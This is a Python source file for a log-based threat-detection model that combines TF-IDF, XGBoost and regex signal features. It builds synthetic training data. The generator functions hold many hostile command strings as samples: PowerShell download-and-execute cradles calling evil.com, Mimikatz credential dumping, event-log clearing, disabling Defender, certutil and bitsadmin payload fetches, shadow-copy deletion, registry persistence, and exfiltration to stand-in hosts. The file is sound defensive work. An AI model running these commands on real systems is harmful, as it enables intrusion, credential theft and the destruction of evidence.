"""
upgraded_amides.py -- UpgradedAMIDES unified threat detection model.

Combines:
  - TF-IDF char n-grams (2-4, 8000 features) from AMIDES
  - XGBoost classifier (300 trees, depth 6, lr 0.05) from CyberShield
  - 25 hand-crafted numeric signal features extracted from any log line

Detects 6 threat classes:
  NORMAL, BRUTE_FORCE, DOS_ATTACK, MALWARE, PORT_SCAN, LOG_EVASION
"""

import re
import os
import json
import logging
import numpy as np
import pandas as pd
import scipy.sparse
import joblib
from pathlib import Path
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.preprocessing import LabelEncoder
from sklearn.utils.class_weight import compute_sample_weight
from xgboost import XGBClassifier

logger = logging.getLogger(__name__)

# -- NSL-KDD column names (41 features + label + difficulty) ------------------
NSLKDD_COLUMNS = [
    'duration', 'protocol_type', 'service', 'flag', 'src_bytes', 'dst_bytes',
    'land', 'wrong_fragment', 'urgent', 'hot', 'num_failed_logins', 'logged_in',
    'num_compromised', 'root_shell', 'su_attempted', 'num_root', 'num_file_creations',
    'num_shells', 'num_access_files', 'num_outbound_cmds', 'is_host_login',
    'is_guest_login', 'count', 'srv_count', 'serror_rate', 'srv_serror_rate',
    'rerror_rate', 'srv_rerror_rate', 'same_srv_rate', 'diff_srv_rate',
    'srv_diff_host_rate', 'dst_host_count', 'dst_host_srv_count',
    'dst_host_same_srv_rate', 'dst_host_diff_srv_rate',
    'dst_host_same_src_port_rate', 'dst_host_srv_diff_host_rate',
    'dst_host_serror_rate', 'dst_host_srv_serror_rate',
    'dst_host_rerror_rate', 'dst_host_srv_rerror_rate',
    'label', 'difficulty',
]

# Numeric feature column indices (0-40)
NSLKDD_NUMERIC_COLS = list(range(41))

# -- Threat class metadata -----------------------------------------------------

THREAT_CLASSES = ['NORMAL', 'BRUTE_FORCE', 'DOS_ATTACK', 'MALWARE', 'PORT_SCAN', 'LOG_EVASION']

SEVERITY_MAP = {
    'NORMAL':      'none',
    'BRUTE_FORCE': 'high',
    'DOS_ATTACK':  'critical',
    'MALWARE':     'critical',
    'PORT_SCAN':   'medium',
    'LOG_EVASION': 'high',
}

REMEDIATION_MAP = {
    'NORMAL':      [],
    'BRUTE_FORCE': ['BLOCK_IP', 'LOG_AND_MONITOR', 'ALERT_ADMIN'],
    'DOS_ATTACK':  ['BLOCK_IP', 'ALERT_ADMIN', 'LOG_AND_MONITOR'],
    'MALWARE':     ['BLOCK_IP', 'ALERT_ADMIN', 'LOG_AND_MONITOR'],
    'PORT_SCAN':   ['BLOCK_IP', 'LOG_AND_MONITOR'],
    'LOG_EVASION': ['ALERT_ADMIN', 'LOG_AND_MONITOR'],
}

# NSL-KDD raw label -> UpgradedAMIDES threat class mapping
NSLKDD_MAP = {
    'normal': 'NORMAL',
    # DoS attacks
    'neptune': 'DOS_ATTACK', 'smurf': 'DOS_ATTACK', 'pod': 'DOS_ATTACK',
    'teardrop': 'DOS_ATTACK', 'land': 'DOS_ATTACK', 'back': 'DOS_ATTACK',
    'apache2': 'DOS_ATTACK', 'udpstorm': 'DOS_ATTACK', 'processtable': 'DOS_ATTACK',
    'mailbomb': 'DOS_ATTACK',
    # Port scan / probe
    'portsweep': 'PORT_SCAN', 'nmap': 'PORT_SCAN', 'satan': 'PORT_SCAN',
    'saint': 'PORT_SCAN', 'mscan': 'PORT_SCAN', 'ipsweep': 'PORT_SCAN',
    # Brute force / Remote-to-Local
    'guess_passwd': 'BRUTE_FORCE', 'ftp_write': 'BRUTE_FORCE',
    'imap': 'BRUTE_FORCE', 'phf': 'BRUTE_FORCE', 'spy': 'BRUTE_FORCE',
    'warezclient': 'BRUTE_FORCE', 'warezmaster': 'BRUTE_FORCE',
    'multihop': 'BRUTE_FORCE', 'named': 'BRUTE_FORCE', 'sendmail': 'BRUTE_FORCE',
    'snmpgetattack': 'BRUTE_FORCE', 'snmpguess': 'BRUTE_FORCE',
    'xsnoop': 'BRUTE_FORCE', 'xlock': 'BRUTE_FORCE', 'httptunnel': 'BRUTE_FORCE',
    # Malware / User-to-Root
    'rootkit': 'MALWARE', 'buffer_overflow': 'MALWARE', 'loadmodule': 'MALWARE',
    'perl': 'MALWARE', 'sqlattack': 'MALWARE', 'xterm': 'MALWARE',
    'ps': 'MALWARE', 'worm': 'MALWARE',
}


class UpgradedAMIDES:
    """
    Unified ML model for cyber log threat detection.

    Architecture:
      - TF-IDF (char_wb, ngram 2-4, 8000 features): captures textual patterns
      - 25 numeric signal features: domain-specific heuristics
      - XGBoost (300 trees, depth 6, lr 0.05): classifies combined feature matrix

    Usage:
        model = UpgradedAMIDES()
        lines, labels = model.train_from_socbed('ml_engine/model')
        model.train(lines, labels)
        result = model.predict("suspicious log line here")
        model.save('ml_engine/upgraded_amides.pkl')
        model = UpgradedAMIDES.load('ml_engine/upgraded_amides.pkl')
    """

    def __init__(self):
        # TF-IDF: char n-grams capture sub-word patterns (AMIDES approach)
        self.tfidf = TfidfVectorizer(
            analyzer='char_wb',
            ngram_range=(2, 4),
            max_features=8000,
            sublinear_tf=True,
            min_df=1,
        )
        # XGBoost: gradient boosting on combined sparse+dense features (CyberShield approach)
        self.xgb = XGBClassifier(
            n_estimators=300,
            max_depth=6,
            learning_rate=0.05,
            subsample=0.8,
            colsample_bytree=0.8,
            objective='multi:softprob',
            eval_metric='mlogloss',
            random_state=42,
            tree_method='hist',
            verbosity=0,
        )
        self.label_encoder = LabelEncoder()
        self.is_trained = False

    # -- Feature extraction ----------------------------------------------------

    def parse(self, log_line: str) -> dict:
        """
        Extract 25 numeric signal features from any log line string.

        Features cover: length, symbol density, network indicators,
        auth failures, attack-specific keywords, and evasion patterns.

        Returns:
            dict mapping feature_name -> numeric value
        """
        line = log_line.strip()
        lc = line.lower()

        return {
            # Length / character density
            'line_length':        len(line),
            'word_count':         len(line.split()),
            'digit_ratio':        sum(c.isdigit() for c in line) / max(len(line), 1),
            'special_char_count': sum(not c.isalnum() and not c.isspace() for c in line),
            'uppercase_ratio':    sum(c.isupper() for c in line) / max(len(line), 1),
            # Symbol counts
            'slash_count':        line.count('/'),
            'dot_count':          line.count('.'),
            'semicolon_count':    line.count(';'),
            'pipe_count':         line.count('|'),
            'percent_count':      line.count('%'),
            # Network indicators
            'ip_count':           len(re.findall(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', line)),
            'port_count':         len(re.findall(r':\d{2,5}\b', line)),
            'url_count':          len(re.findall(r'https?://', lc)),
            # Auth / privilege indicators
            'has_failed_auth':    int(bool(re.search(
                r'fail|invalid|denied|unauthorized|wrong\s*pass', lc))),
            'has_admin':          int(bool(re.search(
                r'\badmin\b|\broot\b|\bsudo\b|\bsu\b', lc))),
            # Attack-type keyword indicators
            'has_powershell':     int(bool(re.search(
                r'powershell|pwsh|\.ps1\b|-encodedcommand|-enc\b', lc))),
            'has_scan':           int(bool(re.search(
                r'\bscan\b|\bprobe\b|\bsweep\b|\bnmap\b', lc))),
            'has_malware':        int(bool(re.search(
                r'malware|trojan|virus|ransom|exploit|payload', lc))),
            'has_dos':            int(bool(re.search(
                r'\bddos\b|\bdos\b|\bflood\b|syn\s*flood|overflow', lc))),
            'has_exfil':          int(bool(re.search(
                r'exfil|transfer\b|upload\b|\begress\b|\boutbound\b', lc))),
            # Obfuscation / evasion indicators
            'has_encode':         int(bool(re.search(
                r'base64|obfusc|encodedcommand|-enc\b', lc))),
            'has_registry':       int(bool(re.search(
                r'hkey|regedit|reg\s+add|reg\s+delete|currentversion', lc))),
            'has_process_spawn':  int(bool(re.search(
                r'cmd\.exe|createprocess|\bspawn\b|\bexec\b|shellexec', lc))),
            'has_sql':            int(bool(re.search(
                r'select\b.{0,30}from\b|drop\s+table|union\s+select|1=1', lc))),
            'has_log_clear':      int(bool(re.search(
                r'clear.?log|wevtutil|event.?log.*clear|auditpol', lc))),
        }

    def _numeric_vector(self, log_line: str) -> np.ndarray:
        """Return the 25-element numeric feature array for one log line."""
        return np.array(list(self.parse(log_line).values()), dtype=np.float32)

    def _build_matrix(
        self,
        log_lines: list,
        fit_tfidf: bool = False,
    ) -> scipy.sparse.csr_matrix:
        """
        Build combined feature matrix: TF-IDF (sparse) + numeric (dense).
        Shape: (n_samples, 8000 + 25)
        """
        if fit_tfidf:
            tfidf_mat = self.tfidf.fit_transform(log_lines)
        else:
            tfidf_mat = self.tfidf.transform(log_lines)

        numeric_mat = np.vstack([self._numeric_vector(ln) for ln in log_lines])
        return scipy.sparse.hstack(
            [tfidf_mat, scipy.sparse.csr_matrix(numeric_mat)],
            format='csr',
        )

    # -- Training --------------------------------------------------------------

    def train(self, log_lines: list, labels: list):
        """
        Train the model on raw log text strings and their threat class labels.

        Args:
            log_lines: List[str]  -- one log entry per element
            labels:    List[str]  -- threat class label per element
                       Valid values: NORMAL, BRUTE_FORCE, DOS_ATTACK,
                                     MALWARE, PORT_SCAN, LOG_EVASION
        """
        if not log_lines:
            raise ValueError("log_lines is empty -- nothing to train on.")

        print(f"  Building TF-IDF + numeric feature matrix ({len(log_lines)} samples)...")
        X = self._build_matrix(log_lines, fit_tfidf=True)

        y_enc = self.label_encoder.fit_transform(labels)
        n_classes = len(self.label_encoder.classes_)

        # Compute per-sample weights to handle class imbalance
        weights = compute_sample_weight('balanced', y_enc)

        self.xgb.set_params(num_class=n_classes)
        print(
            f"  Training XGBoost -- {self.xgb.n_estimators} trees, "
            f"depth {self.xgb.max_depth}, lr {self.xgb.learning_rate}, "
            f"{n_classes} classes..."
        )
        self.xgb.fit(X, y_enc, sample_weight=weights)
        self.is_trained = True
        print(f"  Training complete. Classes: {list(self.label_encoder.classes_)}")

    def train_from_csv(self, csv_path: str) -> tuple:
        """
        Load NSL-KDD CSV and return (log_lines, labels) ready for train().

        NSL-KDD format (no header row):
          - Columns 0-40  : 41 numeric features
          - Column 41     : attack label  (e.g. 'normal', 'neptune')
          - Column 42     : difficulty score (ignored)

        Each row is converted to a space-separated string of feature values
        for TF-IDF. The label is mapped via NSLKDD_MAP.

        Returns:
            (lines: List[str], labels: List[str])
        """
        print(f"  Reading NSL-KDD: {csv_path}")
        # Assign column names; handle files with or without difficulty column
        n_cols = pd.read_csv(csv_path, header=None, nrows=1).shape[1]
        col_names = NSLKDD_COLUMNS[:n_cols]
        df = pd.read_csv(csv_path, header=None, names=col_names)

        lines, labels = [], []
        skipped = 0

        for _, row in df.iterrows():
            raw_label = str(row['label']).strip().lower().rstrip('.')
            threat = NSLKDD_MAP.get(raw_label)
            if threat is None:
                skipped += 1
                continue
            # Represent the 41 numeric features as text for TF-IDF
            line = ' '.join(str(row[c]) for c in col_names[:41])
            lines.append(line)
            labels.append(threat)

        print(f"  Loaded {len(lines)} NSL-KDD samples ({skipped} skipped -- unknown labels)")
        return lines, labels

    def train_from_socbed(self, model_dir: str) -> tuple:
        """
        Generate synthetic training samples informed by SOCBED model metadata.

        The SOCBED model directory contains pre-trained SVM artifacts (ZIP + JSON).
        The JSON metadata files provide class distribution counts, which calibrate
        how many synthetic samples to generate per category.

        Categories:
          powershell       -> PowerShell log-evasion / malicious command patterns
          process_creation -> Windows process creation attack events (EventID 4688)
          proxy_web        -> Malicious web proxy / C2 traffic
          registry         -> Registry persistence / tampering events

        Returns:
            (lines: List[str], labels: List[str])
              labels are either 'LOG_EVASION' (malicious) or 'NORMAL' (benign)
        """
        model_path = Path(model_dir)
        all_lines, all_labels = [], []

        generators = {
            'powershell':       _gen_powershell,
            'process_creation': _gen_process_creation,
            'proxy_web':        _gen_proxy_web,
            'registry':         _gen_registry,
        }

        for cat_name, gen_fn in generators.items():
            cat_path = model_path / cat_name
            if not cat_path.exists():
                print(f"  [WARN] SOCBED folder missing, skipping: {cat_path}")
                continue

            # Read JSON metadata to calibrate sample counts
            json_file = cat_path / 'train_rslt_misuse_svc_rules_f1_0_info.json'
            n_malicious, n_benign = 250, 100  # defaults if JSON unavailable
            if json_file.exists():
                try:
                    info = json.loads(json_file.read_text(encoding='utf-8'))
                    dist = info.get('data', {}).get('class_distribution', {})
                    # JSON keys may be "1"/"0" or "positive"/"negative"
                    raw_m = dist.get('1', dist.get('positive', str(n_malicious)))
                    raw_b = dist.get('0', dist.get('negative', str(n_benign)))
                    n_malicious = int(raw_m) if str(raw_m).lstrip('-').isdigit() else n_malicious
                    n_benign    = int(raw_b) if str(raw_b).lstrip('-').isdigit() else n_benign
                except Exception:
                    pass  # use defaults on any parse error

            mal_samples, ben_samples = gen_fn(n_malicious, n_benign)
            all_lines.extend(mal_samples)
            all_labels.extend(['LOG_EVASION'] * len(mal_samples))
            all_lines.extend(ben_samples)
            all_labels.extend(['NORMAL'] * len(ben_samples))
            print(
                f"  SOCBED [{cat_name:17s}]: "
                f"{len(mal_samples):4d} LOG_EVASION + {len(ben_samples):4d} NORMAL"
            )

        return all_lines, all_labels

    # -- Prediction ------------------------------------------------------------

    def predict(self, log_line: str) -> dict:
        """
        Predict the threat class for a single log line.

        Returns dict with keys:
            threat_type         str   -- e.g. 'BRUTE_FORCE'
            severity            str   -- 'none' | 'medium' | 'high' | 'critical'
            confidence          float -- 0.0 to 1.0
            is_threat           bool
            remediation_actions list  -- e.g. ['BLOCK_IP', 'ALERT_ADMIN']
            top_signals         list  -- top 5 [(feature_name, value), ...]
        """
        if not self.is_trained:
            raise RuntimeError("Model is not trained. Call train() or load() first.")

        X = self._build_matrix([log_line], fit_tfidf=False)
        proba = self.xgb.predict_proba(X)[0]
        pred_idx = int(np.argmax(proba))
        threat_type = self.label_encoder.inverse_transform([pred_idx])[0]
        confidence = float(proba[pred_idx])

        signals = self.parse(log_line)
        top_signals = sorted(
            [(k, v) for k, v in signals.items() if v > 0],
            key=lambda x: x[1],
            reverse=True,
        )[:5]

        return {
            'threat_type':         threat_type,
            'severity':            SEVERITY_MAP.get(threat_type, 'medium'),
            'confidence':          round(confidence, 4),
            'is_threat':           threat_type != 'NORMAL',
            'remediation_actions': REMEDIATION_MAP.get(threat_type, []),
            'top_signals':         top_signals,
        }

    def predict_batch(self, log_lines: list) -> list:
        """
        Predict threat class for a list of log lines.

        Returns:
            List of result dicts (same schema as predict())
        """
        return [self.predict(line) for line in log_lines]

    # -- Persistence -----------------------------------------------------------

    def save(self, path: str):
        """Serialize the trained model to disk using joblib."""
        os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
        joblib.dump(self, path)
        print(f"  Model saved -> {path}")

    @classmethod
    def load(cls, path: str) -> 'UpgradedAMIDES':
        """Deserialize a trained model from disk."""
        obj = joblib.load(path)
        if not isinstance(obj, cls):
            raise TypeError(f"Loaded object is not UpgradedAMIDES: {type(obj)}")
        return obj


# -- Synthetic SOCBED sample generators ---------------------------------------
# Each returns (malicious_list, benign_list).
# Malicious samples = LOG_EVASION (log tampering, evasion, persistence).
# Benign samples    = NORMAL (legitimate administrator activity).
# Fixed seeds ensure reproducible training across runs.

def _gen_powershell(n_mal: int, n_ben: int) -> tuple:
    """Synthetic PowerShell command log samples."""
    import random
    rng = random.Random(42)

    malicious = [
        "powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQ==",
        "powershell.exe -exec bypass -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/stage2.ps1')\"",
        "powershell -c \"[System.Convert]::FromBase64String('aQBlAHgA') | iex\"",
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -sta -nop -w 1 -enc dQBuAGkAYwBvAGQAZQA=",
        "powershell Invoke-Mimikatz -Command '\"sekurlsa::logonpasswords\"'",
        "powershell -nop -exec bypass -EncodedCommand SQBFAFgA",
        "wevtutil cl Security && wevtutil cl System && wevtutil cl Application",
        "Clear-EventLog -LogName Security,System,Application -Confirm:$false",
        "Remove-Item -Path C:\\Windows\\System32\\winevt\\Logs\\Security.evtx -Force",
        "Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true",
        "powershell -c \"auditpol /clear /y\"",
        "powershell Invoke-Expression (New-Object Net.WebClient).DownloadString('http://192.168.99.1/payload.ps1')",
        "powershell -w hidden Invoke-WebRequest http://c2.malware.ru/beacon -Method POST -Body $env:COMPUTERNAME",
        "powershell Get-WinEvent -LogName Security | Export-Csv C:\\tmp\\logins.csv; Remove-Item C:\\winevt\\Security.evtx",
        "powershell [Reflection.Assembly]::LoadWithPartialName('Microsoft.CSharp'); [shellcode]::exec()",
    ]
    benign = [
        "powershell.exe -ExecutionPolicy RemoteSigned -File C:\\Scripts\\backup.ps1",
        "Get-EventLog -LogName Application -Newest 100 | Export-Csv C:\\reports\\app.csv",
        "Set-ExecutionPolicy -ExecutionPolicy AllSigned -Scope LocalMachine",
        "Get-Service | Where-Object {$_.Status -eq 'Running'} | Format-Table",
        "Install-Module -Name PSWindowsUpdate -Force -AllowClobber",
        "powershell -c \"Get-WmiObject Win32_LogicalDisk | Select DeviceID,FreeSpace\"",
        "Invoke-WebRequest -Uri https://download.microsoft.com/update.msi -OutFile update.msi",
        "Get-ChildItem -Recurse C:\\Logs -Include *.log | Compress-Archive -Destination logs.zip",
    ]

    return [rng.choice(malicious) for _ in range(n_mal)], [rng.choice(benign) for _ in range(n_ben)]


def _gen_process_creation(n_mal: int, n_ben: int) -> tuple:
    """Synthetic Windows process creation event log samples (EventID 4688)."""
    import random
    rng = random.Random(43)

    malicious = [
        "EventID=4688 NewProcessName=cmd.exe ParentProcess=explorer.exe CommandLine=cmd /c whoami /all && net user /domain",
        "EventID=4688 NewProcessName=net.exe CommandLine=net user administrator /active:yes",
        "EventID=4688 NewProcessName=schtasks.exe CommandLine=schtasks /create /sc onlogon /tn Updater /tr C:\\tmp\\evil.exe /f",
        "EventID=4688 NewProcessName=regsvr32.exe CommandLine=regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll",
        "EventID=4688 NewProcessName=mshta.exe CommandLine=mshta vbscript:Execute(CreateObject('WScript.Shell').Run('cmd /c del security.evtx'))",
        "EventID=4688 NewProcessName=wmic.exe CommandLine=wmic process call create powershell -enc SQBFAFgA",
        "EventID=1102 AuditLogCleared SubjectUserName=attacker SubjectDomainName=CORP LogName=Security",
        "EventID=4688 NewProcessName=psexec.exe CommandLine=psexec \\\\192.168.1.50 -u admin -p pass123 cmd.exe /c hostname",
        "EventID=4688 NewProcessName=vssadmin.exe CommandLine=vssadmin delete shadows /all /quiet",
        "EventID=4688 NewProcessName=rundll32.exe CommandLine=rundll32 javascript:\"..\\mshtml,RunHTMLApplication\"",
        "EventID=4688 NewProcessName=certutil.exe CommandLine=certutil -urlcache -split -f http://evil.com/mal.exe C:\\tmp\\mal.exe",
        "EventID=4688 NewProcessName=bitsadmin.exe CommandLine=bitsadmin /transfer job http://evil.com/rat.exe C:\\Windows\\Temp\\svchost32.exe",
        "EventID=4688 NewProcessName=cmd.exe CommandLine=cmd /c wevtutil el | ForEach-Object { wevtutil cl $_ }",
        "EventID=4688 NewProcessName=netsh.exe CommandLine=netsh advfirewall set allprofiles state off",
        "EventID=4688 NewProcessName=reg.exe CommandLine=reg add HKLM\\SAM /t REG_BINARY /d evildata /f",
    ]
    benign = [
        "EventID=4688 NewProcessName=notepad.exe ParentProcess=explorer.exe CommandLine=notepad.exe C:\\Users\\user\\notes.txt",
        "EventID=4688 NewProcessName=chrome.exe CommandLine=\"C:\\Program Files\\Google\\Chrome\\chrome.exe\" --new-window",
        "EventID=4688 NewProcessName=svchost.exe ParentProcess=services.exe",
        "EventID=4688 NewProcessName=taskhostw.exe ParentProcess=svchost.exe",
        "EventID=4688 NewProcessName=msiexec.exe CommandLine=msiexec /package Office2021.msi /quiet /norestart",
        "EventID=4688 NewProcessName=wmiprvse.exe ParentProcess=svchost.exe",
        "EventID=4688 NewProcessName=winlogon.exe ParentProcess=smss.exe",
    ]

    return [rng.choice(malicious) for _ in range(n_mal)], [rng.choice(benign) for _ in range(n_ben)]


def _gen_proxy_web(n_mal: int, n_ben: int) -> tuple:
    """Synthetic web proxy / HTTP traffic log samples."""
    import random
    rng = random.Random(44)

    malicious = [
        "GET http://malware-c2.ru/callback?id=infected_host&cmd=exec HTTP/1.1 200 bytes=512",
        "POST http://192.168.99.1/upload?file=credentials.zip HTTP/1.1 200 content-length=4096000",
        "GET http://pastebin.com/raw/aB3xY9kL HTTP/1.1 200 user-agent=powershell/5.1",
        "GET http://evil.xyz/payload.ps1 HTTP/1.1 200 user-agent=powershell",
        "CONNECT 185.220.101.5:443 HTTP/1.1 200 tunnel-established",
        "GET http://update.fakemicrosoft.net/patch.exe HTTP/1.1 200 content-type=application/octet-stream",
        "POST http://data-sink.ru/exfil HTTP/1.1 200 content-length=8192000 bytes-sent=8000000",
        "GET http://bit.ly/3aXb7cD HTTP/1.1 302 location=http://malware-drop.com/payload.exe",
        "GET http://192.168.1.1:4444/shell.php?cmd=id HTTP/1.1 200",
        "GET http://raw.githubusercontent.com/attacker/tools/main/stager.ps1 HTTP/1.1 200 user-agent=powershell/5.1",
        "POST http://10.0.0.5/upload BODY=credentials.db size=2048000 user-agent=python-requests/2.26",
        "GET http://beacon.c2server.tk/check?host=WIN-CORP-01 HTTP/1.1 200",
        "GET http://malicious-domain.xyz/dropper.exe HTTP/1.1 200 content-type=application/x-msdownload",
        "CONNECT tor-exit-node.onion.to:9001 HTTP/1.1 200",
        "POST http://webhook.site/abcd1234 HTTP/1.1 200 BODY=hostname=WIN10&user=admin&loot=ntlm_hashes",
    ]
    benign = [
        "GET https://www.google.com/search?q=python+tutorial HTTP/1.1 200",
        "GET https://cdn.office365.com/updates/v2/manifest.xml HTTP/1.1 200",
        "POST https://api.github.com/repos/myorg/myrepo/issues HTTP/1.1 201",
        "GET https://download.microsoft.com/windowsupdate/v2 HTTP/1.1 200",
        "GET https://fonts.googleapis.com/css2?family=Roboto HTTP/1.1 200",
        "GET https://www.stackoverflow.com/questions/12345678 HTTP/1.1 200",
        "POST https://slack.com/api/chat.postMessage HTTP/1.1 200",
        "GET https://s3.amazonaws.com/company-bucket/reports/q3.pdf HTTP/1.1 200",
    ]

    return [rng.choice(malicious) for _ in range(n_mal)], [rng.choice(benign) for _ in range(n_ben)]


def _gen_registry(n_mal: int, n_ben: int) -> tuple:
    """Synthetic Windows registry event log samples."""
    import random
    rng = random.Random(45)

    malicious = [
        "EventID=13 TargetObject=HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe Details=cmd.exe",
        "EventID=13 TargetObject=HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater Details=C:\\tmp\\malware.exe",
        "EventID=12 TargetObject=HKLM\\SYSTEM\\CurrentControlSet\\Services\\malSvc ImagePath=C:\\tmp\\evil.exe start=2",
        "EventID=13 TargetObject=HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit Details=userinit.exe,C:\\tmp\\backdoor.exe",
        "EventID=13 TargetObject=HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware Details=1",
        "EventID=13 TargetObject=HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\payload Details=powershell -enc SQBFAFgA",
        "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1",
        "EventID=4657 ObjectName=HKEY_LOCAL_MACHINE\\SAM\\SAM OperationType=SetValue NewValue=<binary> SubjectUserName=SYSTEM",
        "EventID=13 TargetObject=HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe Details=cmd.exe",
        "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d C:\\Windows\\Temp\\svhost.exe",
        "EventID=13 TargetObject=HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages Details=mimilib",
        "reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\{36FC9E60} /f",
        "EventID=13 TargetObject=HKCU\\SOFTWARE\\Classes\\mscfile\\shell\\open\\command Details=cmd.exe",
        "EventID=4657 ObjectName=HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom OperationType=Created SubjectUserName=attacker",
        "reg add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\mal /v StartExe /d C:\\tmp\\evil.exe",
    ]
    benign = [
        "EventID=12 TargetObject=HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDrive",
        "EventID=13 TargetObject=HKCU\\Control Panel\\Desktop\\WallPaper Details=C:\\Users\\user\\Pictures\\wallpaper.jpg",
        "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        "EventID=12 TargetObject=HKLM\\SOFTWARE\\Google\\Chrome\\BLBeacon\\version Details=108.0.5359.98",
        "EventID=13 TargetObject=HKCU\\SOFTWARE\\Microsoft\\Office\\16.0\\Word\\RecentFiles\\File1",
        "reg add HKCU\\SOFTWARE\\MyApp /v Language /t REG_SZ /d en-US",
        "EventID=13 TargetObject=HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\S-1-5-21",
    ]

    return [rng.choice(malicious) for _ in range(n_mal)], [rng.choice(benign) for _ in range(n_ben)]
